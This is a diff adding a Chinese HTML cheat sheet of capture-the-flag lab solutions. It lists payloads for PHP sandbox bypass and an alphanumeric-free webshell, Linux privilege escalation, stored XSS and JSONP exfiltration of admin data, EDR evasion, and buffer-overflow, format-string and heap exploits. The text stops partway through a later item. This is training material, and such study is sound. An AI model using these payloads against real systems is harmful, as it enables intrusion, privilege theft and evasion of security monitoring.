@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<title>分级通关第三级 · 通关速查手册</title>
+<style>
+  @page { size: A4; margin: 13mm 12mm 14mm 12mm; }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0; color: #1a1a1a; background: #fff;
+    font: 9.2pt/1.52 "Segoe UI", "Microsoft YaHei", "PingFang SC", sans-serif;
+    -webkit-print-color-adjust: exact; print-color-adjust: exact;
+  }
+  .wrap { max-width: 186mm; margin: 0 auto; padding: 4mm 0 10mm; }
+
+  header.top { border-bottom: 2.5px solid #1f4e79; padding-bottom: 5px; margin-bottom: 9px; }
+  header.top h1 { margin: 0 0 3px; font-size: 19pt; letter-spacing: .5px; }
+  header.top .sub { font-size: 8.6pt; color: #5b6470; }
+  header.top .sub b { color: #1f4e79; }
+
+  h2.part {
+    font-size: 12.5pt; margin: 0 0 7px; padding: 3px 0 3px 8px;
+    border-left: 5px solid #1f4e79; background: #f2f5f8;
+    page-break-before: always; page-break-after: avoid;
+  }
+  h2.part span.no { color: #1f4e79; margin-right: 6px; }
+  section.part:first-of-type h2.part { page-break-before: auto; }
+
+  h3.dir {
+    font-size: 10.6pt; margin: 9px 0 5px; padding-bottom: 2px;
+    border-bottom: 1px solid #cfd6dd; page-break-after: avoid;
+  }
+  h3.dir em { font-style: normal; font-weight: 400; font-size: 8.2pt; color: #6b7480; margin-left: 6px; }
+
+  .item { margin: 0 0 6px; page-break-inside: avoid; }
+  .item .hd { font-size: 9.3pt; font-weight: 700; margin-bottom: 1px; }
+  .item .hd .g { color: #1f4e79; }
+  .item .hd .tag { font-weight: 400; font-size: 8.3pt; color: #6b7480; margin-left: 5px; }
+  .item p { margin: 1px 0 3px; }
+  .item p.k { color: #33383f; }
+
+  code {
+    font-family: Consolas, "Cascadia Mono", "Courier New", monospace;
+    font-size: 8.1pt; background: #eceff3; color: #123; padding: 0 2px; border-radius: 2px;
+    word-break: break-all;
+  }
+
+  pre {
+    margin: 3px 0 0; padding: 4px 6px; background: #f6f7f9;
+    border-left: 2.5px solid #b9c6d2; border-radius: 2px;
+    font: 7.5pt/1.45 Consolas, "Cascadia Mono", "Courier New", monospace;
+    white-space: pre-wrap; word-break: break-all; color: #14202b;
+  }
+  pre .c { color: #6b7480; }
+
+  table.tune { width: 100%; border-collapse: collapse; margin: 4px 0 8px; font-size: 8.2pt; }
+  table.tune th, table.tune td { border: 1px solid #cfd6dd; padding: 2.5px 5px; text-align: left; }
+  table.tune th { background: #eef2f6; font-weight: 600; }
+  table.tune td.mono { font-family: Consolas, monospace; font-size: 7.8pt; }
+
+  .note {
+    margin: 5px 0 8px; padding: 4px 7px; font-size: 8.4pt;
+    background: #fbf7ec; border-left: 3px solid #d9b45a; color: #4a4130;
+  }
+  .foot { margin-top: 10px; padding-top: 5px; border-top: 1px solid #d7dbe0; font-size: 7.6pt; color: #8a929b; }
+  @media print { .wrap { max-width: none; padding: 0; } }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header class="top">
+  <h1>分级通关第三级 · 通关速查手册</h1>
+  <div class="sub">
+    <b>3</b> 大方向 · <b>12</b> 个专题 · <b>48</b> 关 —— 每关保留「考点 / 一句话思路 / 最终 payload」，细节见仓库同名 writeup。
+  </div>
+</header>
+
+<div class="note">
+  <b>使用说明：</b>本册按专题成页，一页一个方向，可单独抽页携带。所有 IP / 端口 / 密钥均为当次靶机值，复用时需替换；偏移与目标地址在同类题中固定，可直接抄用。
+</div>
+
+<!-- ============ PART 1 ============ -->
+<section class="part" id="p1">
+<h2 class="part"><span class="no">01</span>内网渗透与高级社工</h2>
+
+<h3 class="dir">免杀 payload 制作<em>PHP 代码执行沙箱 · 静态黑名单 / 沙箱检测 / 函数名过滤</em></h3>
+
+<div class="item">
+  <div class="hd"><span class="g">G1</span> 静态关键词黑名单<span class="tag">chr 造字符 + 字符串拆分</span></div>
+  <p class="k">后端 eval 执行提交的 PHP。黑名单子串匹配：<code>system/exec/shell_exec/passthru/popen/proc_open/cat/flag/ / | ` $ &gt; &lt;</code>。文件读取函数不在名单内，只需绕开 <code>/</code> 与 <code>flag</code> 两个词。</p>
+<pre>readfile(chr(47).'fl'.'ag');</pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G2</span> 无字母数字 WebShell<span class="tag">标点异或 + 动态函数调用</span></div>
+  <p class="k"><code>$_</code> 是合法变量名，可作函数名载体；两个非字母数字标点异或可得到任意字母，再用 <code>.</code> 拼接。示例：<code>(')'^'[')</code>=r、<code>('%'^'@')</code>=e。</p>
+<pre>$_=((')'^'[').('%'^'@').('!'^'@').('$'^'@').('&amp;'^'@').(')'^'@').(','^'@').('%'^'@'));$_('/'.('&amp;'^'@').(','^'@').('!'^'@').('\''^'@'));</pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G3</span> 沙箱动态检测绕过<span class="tag">检测条件与真实 flag 前缀不匹配</span></div>
+  <p class="k">静态层同 G1；动态层只判断沙箱输出是否含 <code>flag{</code>，而本题 flag 前缀为 <code>vmc{</code>，检测形同虚设，G1 payload 直接打穿。若检测逻辑正常，则改为输出编码后的内容。</p>
+<pre>readfile(chr(47).'fl'.'ag');
+<span class="c">// 通用绕法：不让明文出现在沙箱输出里</span>
+echo base64_encode(file_get_contents(chr(47).'fl'.'ag'));</pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G4</span> 敏感函数名过滤<span class="tag">eval 未过滤 → 拼接函数名</span></div>
+  <p class="k"><code>readfile</code>、<code>chr</code> 均被拦，但 <code>eval</code> 放行。把函数名拆成两段字符串拼接，静态检测就看不到完整敏感词。</p>
+<pre>$func = "base64_" . "decode";
+eval($func('cmVhZGZpbGUoY2hyKDQ3KS4nZmwnLidhZycpOw=='));
+<span class="c">// 等价直连写法</span>
+$f = "readf"."ile"; $c = "ch"."r"; $f($c(47).'fl'.'ag');</pre>
+</div>
+
+<h3 class="dir">权限提升维持<em>Linux 提权四件套 · sudo / SUID / cron / 竞态</em></h3>
+
+<div class="item">
+  <div class="hd"><span class="g">G1</span> sudo 免密命令滥用<span class="tag">GTFOBins: find</span></div>
+  <p class="k"><code>sudo -l</code> 得到 <code>(root) NOPASSWD: /usr/bin/find</code>，<code>find -exec</code> 可以执行任意命令。</p>
+<pre>sudo find /etc/hostname -maxdepth 0 -exec sh -c 'id; cat /flag' \;</pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G2</span> SUID 程序 + PATH 劫持<span class="tag">svcstat 内部以相对路径调 ps</span></div>
+  <p class="k"><code>find / -perm -4000 2&gt;/dev/null</code> 发现可疑的 <code>/usr/local/bin/svcstat</code>（root:root、带 s 位），运行后输出 <code>ps -ef</code> 结果 —— 说明它内部调用了未写全路径的 <code>ps</code>。伪造同名文件并把它所在目录塞到 PATH 最前。</p>
+<pre>echo "cat /flag" &gt; ~/ps &amp;&amp; chmod +x ~/ps
+export PATH=~:$PATH
+/usr/local/bin/svcstat</pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G3</span> cron 定时任务 + tar 通配符注入<span class="tag">/etc/cron.d 每分钟 root 执行 tar czf *</span></div>
+  <p class="k"><code>/etc/cron.d/backup</code> 中 root 每分钟执行 <code>cd /var/backups/incoming &amp;&amp; tar czf ... *</code>。该目录可写，于是用 <code>-</code> 开头的文件名冒充 tar 选项，借 <code>--checkpoint-action=exec</code> 执行命令。</p>
+<pre>cd /var/backups/incoming
+touch -- "--checkpoint=1"
+touch -- "--checkpoint-action=exec='sh shell.sh'"
+echo 'cat /flag &gt; /tmp/flag' &gt; shell.sh &amp;&amp; chmod +x shell.sh
+<span class="c"># 等一分钟，通配符展开后等价于：
+# tar czf data.tar.gz --checkpoint-action=exec='sh shell.sh' --checkpoint=1 shell.sh</span>
+cat /tmp/flag</pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G4</span> TOCTOU 符号链接竞态<span class="tag">publishd 每 0.2s 检查 -f 再 cat</span></div>
+  <p class="k">root 脚本循环判断 <code>[ -f "$f" ] &amp;&amp; [ ! -L "$f" ]</code> 后 <code>cat "$f" &gt; /var/published/out</code>，检查与使用之间存在窗口。用两个脚本对撞：一个疯狂在普通文件与指向 <code>/flag</code> 的软链之间切换，一个疯狂读产物。</p>
+<pre><span class="c"># a.sh —— 制造竞态</span>
+while true; do touch /var/spool/publish/report; ln -sf /flag /var/spool/publish/report; sleep 0.1; rm -f /var/spool/publish/report; done
+<span class="c"># b.sh —— 收 flag</span>
+while true; do cat /var/published/out; sleep 0.1; done
+<span class="c"># 执行：./a.sh &amp; ./b.sh</span></pre>
+</div>
+
+<h3 class="dir">社交平台钓鱼<em>身份标识不一致 / XSS / OAuth / JSONP</em></h3>
+
+<div class="item">
+  <div class="hd"><span class="g">G1</span> Unicode NFKC 同形字账号<span class="tag">注册去重与登录解析用了两套规则</span></div>
+  <p class="k">注册按原始字符串去重（<code>official</code> 已被占），但登录/身份解析走 <code>normalize("NFKC", name).casefold()</code>。全角字母归一化后与半角完全相等，于是用全角名注册即可顶替官方账号。</p>
+<pre>用户名：ｏｆｆｉｃｉａｌ   <span class="c"># U+FF4F U+FF46 U+FF46 U+FF49 U+FF43 U+FF49 U+FF41 U+FF4C</span>
+密码：  pwn123
+<span class="c"># 注册后自动登录并跳转 /dm，直接读官方私信里的凭据</span></pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G2</span> 存储型 XSS 打客服后台<span class="tag">工单详情未过滤 · 回写 /ticket/1/reply</span></div>
+  <p class="k">工单详情可存 HTML，客服（管理员）会打开工单页。用 <code>onload</code> 把页面已渲染文本（含密钥）POST 回自己的工单。过滤只删 <code>&lt;script</code>，用 <code>&lt;svg onload&gt;</code> 或 <code>&lt;sc&lt;scriptript&gt;</code> 绕过。</p>
+<pre>&lt;svg onload="fetch('http://IP:PORT/ticket/1/reply',{
+  method:'POST',
+  headers:{'Content-Type':'application/x-www-form-urlencoded'},
+  body:'body='+encodeURIComponent(document.body.innerText)
+})"&gt;&lt;/svg&gt;</pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G3</span> OAuth 2.0 授权码劫持<span class="tag">scope 未校验 · redirect_uri 可回环</span></div>
+  <p class="k">自建应用拿到 client_id / secret / redirect_uri，构造授权链接发给管理员，管理员点开即生成绑定其身份的 code；再用 code 换 access_token，读 <code>/api/me</code>。<code>scope=private</code> 为猜解值。</p>
+<pre>http://IP:PORT/oauth/authorize?client_id=app_74457116de74&amp;redirect_uri=/oauth/cb/app_74457116de74&amp;scope=private
+<span class="c"># 拿到 code 后：</span>
+POST /oauth/token   client_id, client_secret, redirect_uri, code, grant_type=authorization_code
+GET  /api/me        Authorization: Bearer &lt;access_token&gt;</pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G4</span> JSONP 绕过 CSP + HttpOnly<span class="tag">callback 可控 → 借管理员会话读内部接口</span></div>
+  <p class="k">页面尾部引用 <code>/api/jsonp?callback=showNotice</code>，callback 直接拼进脚本，可注入任意 JS（同源、且不受 CSP 限制）。HttpOnly 拿不到 cookie，但可以借会话直接请求 <code>/admin/secret</code>，把结果回写到工单。</p>
+<pre>&lt;script src="/api/jsonp?callback=fetch('%2Fadmin%2Fsecret').then(r%3D%3Er.text()).then(x%3D%3Efetch('%2Freport%2F1%2Freply'%2C%7Bmethod%3A'POST'%2Cheaders%3A%7B'Content-Type'%3A'application%2Fx-www-form-urlencoded'%7D%2Cbody%3A'body%3D'%2BencodeURIComponent(x)%7D))"&gt;&lt;/script&gt;
+<span class="c">// 可读形式</span>
+fetch('/admin/secret').then(r=&gt;r.text()).then(x=&gt;fetch('/report/1/reply',{
+  method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'},
+  body:'body='+encodeURIComponent(x) }))</pre>
+</div>
+
+<h3 class="dir">终端 EDR 绕过<em>命令行审计 / execve 拦截 / libc hook / syscall 审计</em></h3>
+
+<div class="item">
+  <div class="hd"><span class="g">G1</span> 命令行子串审计<span class="tag">转义符 + 通配符</span></div>
+  <p class="k"><code>cat /flag</code> 命中 <code>flag</code>，<code>cat /f???</code> 又命中 <code>cat</code>。审计看的是原始命令行字符串，而 shell 解析在审计之后：反斜杠拆开命令名，通配符拆开文件名，两头都不出现完整敏感词。</p>
+<pre>ca\t /f???      <span class="c"># shell 去掉反斜杠后即 cat /flag</span>
+nl /f*          <span class="c"># 备选：nl 不在名单，/f* 由 shell 展开</span></pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G2</span> execve 拦截<span class="tag">LD_PRELOAD 钩子 + 禁止派生子进程</span></div>
+  <p class="k">命令被塞进 <code>/bin/sh -c</code> 且 <code>LD_PRELOAD</code> 挂了 guard，任何 <code>execve</code> 都被阻断。改用不派生子进程的 shell 内建命令（<code>read/echo/printf/set</code> 等）。</p>
+<pre>read FLAG &lt; /flag &amp;&amp; echo $FLAG</pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G3</span> libc 层 open hook<span class="tag">绕开封装函数，直接走 syscall</span></div>
+  <p class="k">EDR 在用户态 hook 了 libc 的 <code>open</code>，<code>cat</code> 和 <code>fopen</code> 全被拦。syscall 指令不经过 libc 封装，钩子失效。</p>
+<pre>#include &lt;sys/syscall.h&gt;
+long fd = syscall(SYS_open, "/flag", 0);
+syscall(SYS_read, fd, buffer, sizeof(buffer));
+printf("%s\n", buffer);</pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G4</span> syscall 参数审计<span class="tag">路径字符串匹配 → 相对路径变形</span></div>
+  <p class="k">在 G3 基础上 EDR 开始审计 syscall 参数，但仍按字面匹配 <code>/flag</code>。加一段无意义的 <code>..</code> 回退，内核解析结果相同，字符串不同。</p>
+<pre>long fd = syscall(SYS_open, "/tmp/../flag", 0);
+syscall(SYS_read, fd, buffer, sizeof(buffer));
+printf("%s\n", buffer);</pre>
+</div>
+</section>
+
+<!-- ============ PART 2 ============ -->
+<section class="part" id="p2">
+<h2 class="part"><span class="no">02</span>系统层漏洞利用与逆向分析</h2>
+
+<div class="note">
+  <b>栈溢出偏移速查</b>（32 位 PE 为 <code>p32</code>，64 位 ELF 为 <code>p64</code>；目标统一为 <code>get_flag</code> / <code>print_flag</code>）
+</div>
+
+<table class="tune">
+  <tr><th style="width:15%">关卡</th><th style="width:20%">缓冲区 / 偏移</th><th style="width:24%">目标地址</th><th>关键约束</th></tr>
+  <tr><td>DEP-G1</td><td class="mono">64 / 68</td><td class="mono">0x00401000</td><td>纯 ret2text，无参数</td></tr>
+  <tr><td>DEP-G2</td><td class="mono">128 / 132</td><td class="mono">0x00401000</td><td>参数 0xDEADBEEF；地址后需再填一个假返回地址</td></tr>
+  <tr><td>DEP-G3</td><td class="mono">256 / 260</td><td class="mono">0x00401000 → 0x00401010</td><td>先 <code>set_key(0xCAFEBABE)</code> 再 <code>get_flag</code></td></tr>
+  <tr><td>DEP-G4</td><td class="mono">128 / 132</td><td class="mono">0x00401000</td><td>先满足前置 <code>fread(0x200)</code>，再 gets 溢出</td></tr>
+  <tr><td>GS-G1</td><td class="mono">256</td><td class="mono">0x00401000</td><td>程序泄露 buf 与全局 cookie，EBP = buf + 0x104</td></tr>
+  <tr><td>GS-G2</td><td class="mono">64</td><td class="mono">0x00401000</td><td>格式化串泄露 cookie（第 80 个槽位）</td></tr>
+  <tr><td>GS-G3</td><td class="mono">64</td><td class="mono">0x00401000</td><td>改函数指针，绕开 ret 前的 cookie 检查</td></tr>
+  <tr><td>GS-G4</td><td class="mono">256 / 320</td><td class="mono">0x00401000</td><td>先 fread(64) 打格式化串取 EBP，再 gets 溢出</td></tr>
+  <tr><td>补丁-G1</td><td class="mono">64 / 72</td><td class="mono">0x004011D6</td><td>x86-64 需 ret gadget 0x0040101A 对齐栈</td></tr>
+  <tr><td>补丁-G2</td><td class="mono">—</td><td class="mono">0x00401296</td><td>格式化串任意写，改写 0x00404098 处函数指针</td></tr>
+</table>
+
+<h3 class="dir">DEP 数据执行保护利用<em>32 位 PE · gets 溢出 · 栈不可执行 → ret2text</em></h3>
+
+<div class="item">
+  <div class="hd"><span class="g">G1</span> 基础 ret2text<span class="tag">Ghidra 定位 get_flag 0x401000</span></div>
+  <p class="k">栈不可执行，但 <code>.text</code> 可执行。溢出覆盖返回地址跳程序自带函数即可。</p>
+<pre>payload = b"A" * 68 + p32(0x00401000)   <span class="c"># buf 64 + saved EBP</span></pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G2</span> 带参数的 ret2text<span class="tag">get_flag(int key) 校验 0xDEADBEEF</span></div>
+  <p class="k">cdecl 参数在栈上。返回地址之后紧跟的是「假返回地址」，再之后才是第一个参数 —— 少填一个 4 字节就会被当成返回地址。</p>
+<pre>payload  = b"A" * 132
+payload += p32(0x00401000)   <span class="c"># get_flag</span>
+payload += p32(0x00401000)   <span class="c"># 假返回地址（内容不限）</span>
+payload += p32(0xDEADBEEF)   <span class="c"># param1</span></pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G3</span> 构造 ROP 链<span class="tag">set_key 写全局 → get_flag 校验</span></div>
+  <p class="k">get_flag 不再从栈取参，而是校验全局变量 <code>0x0041D9B8</code> 是否等于 <code>-0x35014542</code>（即 <code>0xCAFEBABE</code>）。程序恰好导出了 <code>set_key(param)</code> 写这个全局，串成两跳链。</p>
+<pre>payload  = b"A" * 260
+payload += p32(0x00401000)   <span class="c"># set_key，返回后落到下一格</span>
+payload += p32(0x00401010)   <span class="c"># get_flag</span>
+payload += p32(0xCAFEBABE)   <span class="c"># set_key 的参数（同时充当 get_flag 的假返回地址）</span></pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G4</span> 前置 fread 消耗<span class="tag">先读 0x200 字节才进入 gets</span></div>
+  <p class="k"><code>_fread(&amp;READ_ADDR,1,0x200,_File)</code> 先吞掉 512 字节，然后才 <code>gets(buff)</code>。<code>_File</code> 是库内数据不是局部变量，所以偏移仍是 128+4。</p>
+<pre>sock.sendall(b"A" * 511 + b"\n")            <span class="c"># 喂饱 fread(0x200)</span>
+sock.sendall(b"A" * 132 + p32(0x00401000))  <span class="c"># gets 溢出</span></pre>
+</div>
+
+<h3 class="dir">GS 缓冲区安全检查利用<em>MSVC /GS · 栈 cookie · 泄露 / 绕过 / 覆盖指针</em></h3>
+
+<div class="item">
+  <div class="hd"><span class="g">G1</span> 程序主动泄露 cookie<span class="tag">printf 输出 Buffer@ 与 Cookie:</span></div>
+  <p class="k">栈 cookie = <code>__security_cookie ^ EBP</code>，存于 <code>EBP-4</code>，缓冲在 <code>EBP-0x104</code>。程序把两者都打印出来了，直接重建。</p>
+<pre>ebp = buf_addr + 0x104
+stack_cookie = global_cookie ^ ebp
+payload  = b"A" * 256
+payload += p32(stack_cookie)   <span class="c"># 伪造 cookie</span>
+payload += p32(0xdeadbeef)     <span class="c"># saved EBP（get_flag 不返回，随便填）</span>
+payload += p32(0x00401000)     <span class="c"># ret = get_flag</span></pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G2</span> 格式化字符串泄露 cookie<span class="tag">printf(buf256) 直接可控格式串</span></div>
+  <p class="k">buff256 在 <code>Stack[-0x148]</code>，cookie 在 <code>Stack[-0x8]</code>，每 4 字节一个槽位，故第 <code>(0x148-0x8)/4 = 80</code> 个 <code>%p</code> 就是栈上 cookie（0-based）。</p>
+<pre>r.sendline(b'%p ' * 81)
+cookie = int(r.recvline().split()[80], 16)
+payload = b"A" * 64 + p32(cookie) + p32(0xdeadbeef) + p32(0x00401000)</pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G3</span> 覆盖函数指针绕过检查<span class="tag">p_function 位于 buff 与 cookie 之间</span></div>
+  <p class="k">函数在 <code>gets</code> 之后调用 <code>(*p_function)()</code>，而 <code>p_function</code> 在栈上位置比 cookie 更靠近缓冲区。改它就不用碰 cookie，安全检查根本走不到。</p>
+<pre>payload = b"A" * 64 + p32(0x00401000)   <span class="c"># buff[64] 之后紧邻 p_function</span></pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G4</span> 两层栈帧：fmt 取 EBP + gets 溢出<span class="tag">printf_wrapper(buff64) 后 gets(buff256)</span></div>
+  <p class="k">第一次输入进 <code>buff64</code> 并被当作格式串，栈上第一个 <code>%p</code> 正好是漏洞函数的 EBP；配合程序泄露的全局 cookie 算出栈 cookie。第二次 <code>gets(buff256)</code> 完成溢出，偏移为 256+64。</p>
+<pre>r.sendline(b'%p' * 31)
+EBP = int(stack[0], 16)
+cookie = global_cookie ^ EBP
+payload = b"A" * 320 + p32(cookie) + p32(0xdeadbeef) + p32(0x00401000)</pre>
+</div>
+
+<h3 class="dir">安全补丁对比分析<em>v1 / v2 差分 · 补丁即漏洞点</em></h3>
+
+<div class="item">
+  <div class="hd"><span class="g">G1</span> gets → fgets<span class="tag">64 位 ELF · 需栈对齐</span></div>
+  <p class="k">v1 导入 <code>gets</code>、v2 换成 <code>fgets(buf, 0x40, stdin)</code>，补丁点即漏洞点。username 在 <code>RBP-0x40</code>，到返回地址 64+8。System V ABI 要求 CALL 时 16 字节对齐，故先滑一个 <code>ret</code>。</p>
+<pre>payload  = b"A" * (0x40 + 8)
+payload += p64(0x0040101a)   <span class="c"># ret gadget，对齐栈</span>
+payload += p64(0x004011d6)   <span class="c"># print_flag</span>
+<span class="c"># Username 处发送 payload，Password 随便填</span></pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G2</span> printf(fmt) → printf("%s")<span class="tag">格式化字符串任意地址写</span></div>
+  <p class="k">输入缓冲区从第 10 个位置参数开始出现，payload 补齐 32 字节后地址落在第 14、15 槽。用 <code>%hhn</code> 写高字节、<code>%hn</code> 写低两字节，避免 <code>%n</code> 产生 4MB 输出。</p>
+<pre>payload  = b"%64c%15$hhn%4694c%14$hn"
+payload  = payload.ljust(32, b"A")
+payload += p64(0x00404098)       <span class="c"># 低 2 字节 → 0x1296</span>
+payload += p64(0x00404098 + 2)   <span class="c"># 高 1 字节 → 0x40</span>
+<span class="c"># 结果：该函数指针被改成 0x00401296 (get_flag)</span></pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G3</span> UAF：delete 后指针未清<span class="tag">obj-mgr 四个命令</span></div>
+  <p class="k">v1 的 <code>delete</code> 只 <code>free</code> 不清表，<code>use</code> 仍会调用表里的函数指针。删掉后用 <code>alloc_data</code> 申请同尺寸块即可原位覆盖。</p>
+<pre>create 1
+delete 1
+alloc_data 1 0x004012b6
+use 1</pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G4</span> 16 位乘法截断 → 堆溢出<span class="tag">malloc(size) 用 16 位，memcpy 用 64 位</span></div>
+  <p class="k"><code>size = buff_1 * buff_0</code> 存进 16 位变量后回绕；<code>memcpy</code> 的长度 <code>n</code> 用 64 位计算，于是拷贝量远超分配量，直接盖掉紧邻的 <code>exec_ptr</code>。64 位下 malloc 最小 chunk 为 0x20。</p>
+<pre><span class="c"># 3 * 21846 = 0x10002 → 截断后 malloc(2)</span>
+payload  = p16(3) + p16(21846)
+payload += b"A" * 0x20          <span class="c"># 覆盖最小 chunk</span>
+payload += p64(0x004013A2)      <span class="c"># exec_ptr → 目标函数</span></pre>
+</div>
+
+<h3 class="dir">软件逆向静态分析<em>异或 / RC4 / 位变换 / 花指令</em></h3>
+
+<div class="item">
+  <div class="hd"><span class="g">G1</span> 单字节异或校验<span class="tag">静态链接 stripped ELF · 长度 42</span></div>
+  <p class="k">从 <code>entry</code> 追 <code>__libc_start_main</code> 的第一参数得 main；字符串 <code>Enter the flag:</code> 定位。核心循环 <code>(input[i] ^ 0xAA) == enc[i]</code>，密文在 <code>0x481140</code>。</p>
+<pre>data = [0xcc,0xc6,0xcb,0xcd,0xd1,0x9d,0xcf,0x99, ... ]   <span class="c"># 0x481140，42 字节</span>
+flag = ''.join(chr(b ^ 0xAA) for b in data)</pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G2</span> RC4<span class="tag">KSA 256 轮 + PRGA 逐字节异或</span></div>
+  <p class="k">伪代码里 0~255 初始化 S 盒、<code>j = (j + S[i] + key[i%len]) % 256</code>、再交换 —— 标准 RC4。密钥取 <code>0x140004070</code> 前 8 字节，密文取 <code>0x140004040</code> 前 42 字节。</p>
+<pre>KEY = bytes([0x2F,0x9E,0x4A,0xC3,0x71,0x85,0xD6,0x1B])
+plain = rc4(KEY, ENC)      <span class="c"># 异或可逆，加密函数直接当解密用</span></pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G3</span> 位变换 + 半字节查表<span class="tag">ROL4 → ROR3 → nibble S-box</span></div>
+  <p class="k">逐字节 <code>_ROL1_(b,4)</code> 再 <code>_ROR1_(b,3)</code>，然后拆高低 4 位分别查 16 字节表拼回。逆运算：先反查表，再 ROR4、ROL3。</p>
+<pre>b = ror4(rol3(sbox_inv[b &gt;&gt; 4] &lt;&lt; 4 | sbox_inv[b &amp; 0xF]))
+<span class="c"># 等价：reverse_14000149C 后 reverse_1400014B2</span>
+flag = ''.join(chr(reverse_byte(x)) for x in ENC)   <span class="c"># 42 字节</span></pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G4</span> 花指令 + 异或<span class="tag">jz/jnz 跳进指令中间</span></div>
+  <p class="k"><code>0x401905</code> 处 <code>jz/jnz</code> 跳到 <code>call</code> 的第二个字节，反编译器直接罢工。把 <code>0x401909</code> 的 <code>E8</code>、<code>0x40190E</code> 的 <code>48</code> 都改成 <code>90</code>(NOP)，再在 <code>0x401905</code> 按 P 建函数，逻辑立刻清晰。</p>
+<pre><span class="c"># 修复后：while ((input[i] ^ 0x7C) == byte_481140[i]) i++</span>
+flag = ''.join(chr(b ^ 0x7C) for b in data)   <span class="c"># 0x481140 前 42 字节</span></pre>
+</div>
+</section>
+
+<!-- ============ PART 3 ============ -->
+<section class="part" id="p3">
+<h2 class="part"><span class="no">03</span>高级工具与逆向专项</h2>
+
+<h3 class="dir">Binwalk 工具使用<em>固件/镜像拆解 · 提取 → 识别 → 解密</em></h3>
+
+<div class="item">
+  <div class="hd"><span class="g">G1</span> 图片尾部拼接隐藏数据<span class="tag">PNG 后接 gzip + ELF</span></div>
+  <p class="k">PNG 解析到 <code>IEND</code> 即停止，尾附数据不可见。<code>binwalk</code> 扫出 0x0 PNG / 0x90B gzip / 0x957 ELF，<code>-e</code> 自动解压出 base64 文本。</p>
+<pre>binwalk logo.png
+binwalk -e logo.png
+<span class="c"># v3.x → extractions/logo.png.extracted/90B/decompressed.bin
+# v2.x → _logo.png.extracted/</span>
+<span class="c"># 内容：ZmxhZ3tlNGE3YzJmOS0xYjNkLTRlOGEtOWM2Zi0yZDViOGUxYTRmN2N9
+# 解码：flag{e4a7c2f9-1b3d-4e8a-9c6f-2d5b8e1a4f7c}</span></pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G2</span> 递归提取 + 单字节异或<span class="tag">firmware.bin 内嵌 payload_xor5A.bin</span></div>
+  <p class="k"><code>-Me</code> 递归匹配并提取所有层级。挖出的文件名直接把密钥写脸上了：<code>xor5A</code>。</p>
+<pre>binwalk -Me firmware.bin
+python -c "d=open('payload_xor5A.bin','rb').read(); print(bytes(x^0x5A for x in d))"</pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G3</span> squashfs 文件系统 + 凯撒<span class="tag">/etc/config/flag.conf</span></div>
+  <p class="k">固件里是 squashfs，需 <code>squashfs-tools</code> 才能解。<code>flag.conf</code> 中 <code>synt{...}</code> 是 ROT13 变形（<code>s→f</code>、<code>y→l</code>、<code>n→a</code>）。</p>
+<pre>apt install squashfs-tools
+<span class="c"># CONFIG_FLAG=synt{3q9o6s2p-8n1r-4q7o-ns9p-1r4n7q2o6p8s}
+# ROT13 → flag{3d9b6f2c-8a1e-4d7b-af9c-1e4a7d2b6c8f}</span></pre>
+</div>
+
+<div class="item">
+  <div class="hd"><span class="g">G4</span> 熵分析定位加密区 + AES<span class="tag">device.img · 0x250000 之后高熵</span></div>
+  <p class="k"><code>binwalk -E</code> 画熵图，0x250000 之后接近 8 bit/byte，说明是压缩或加密。按偏移切片后，明文 JSON 尾部泄露了 <code>decrypt_key</code>，试出 AES-256-ECB。</p>
+<pre>binwalk -E device.img
+dd if=device.img of=encrypted_data.bin bs=1 skip=250000
+<span class="c"># 尾部 JSON: "decrypt_key": "3f8a2c1d7e4b9f5a0c6d2e8f1b7a4c3d9e5f2b8a0d6c4e1f7a3b9d5c2e8f4b1a"</span>
+AES.new(bytes.fromhex(KEY), AES.MODE_ECB).decrypt(payload)</pre>
+</div>
+
+<h3 class="dir">Ghidra 工具使用<em>反编译 · 数据类型 · PyGhidra 脚本 · VM</em></h3>
+
+<div class="item">
+  <div class="hd"><span class="g">G1</span> Feistel 网络逆推<span class="tag">2 轮 · 4 块 × 8 字节 · UUID 骨架</span></div>
+  <p class="k">verify 要求长度 42、<code>flag{</code> 开头、<code>}</code> 结尾，位掩码 <code>0x10842000</code> 规定第 13/18/23/28 位必须是 <code>-</code>，抽出 32 个 hex 字符做 4 组 Feistel。<code>F(x)=x*0x9E3779B9+0xDEADBEEF</code>，加密可逆。</p>
+<pre>def F(x): return ((x * 0x9E3779B9) + 0xDEADBEEF) &amp; 0xFFFFFFFF
+def dec(blk):
+    nL, nR = struct.unpack('&lt;II', blk)
+    R = F(nL) ^ nR
+    L = nL ^ F(R)
+    return struct.pack('&lt;II', L, R)
+<span class="c"># 32 字节密文逐块解出 → 按 {13,18,23,28} 插 '-' → flag{...}</span></pre>
+</div>
+
+<div class="item">
